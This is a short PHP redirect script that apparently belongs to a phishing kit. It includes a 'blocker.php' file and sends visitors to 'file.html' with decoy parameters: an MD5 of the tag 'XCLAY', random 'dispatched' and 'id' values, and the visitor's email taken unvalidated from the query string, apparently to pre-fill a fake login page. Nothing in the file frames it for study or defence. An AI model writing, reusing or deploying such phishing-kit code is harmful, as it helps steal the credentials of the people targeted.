<?php
include('blocker.php');
$email = '';
if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];
header("Location: file.html?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".$email);
}else{
header("Location: file.html?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."");
}

?>
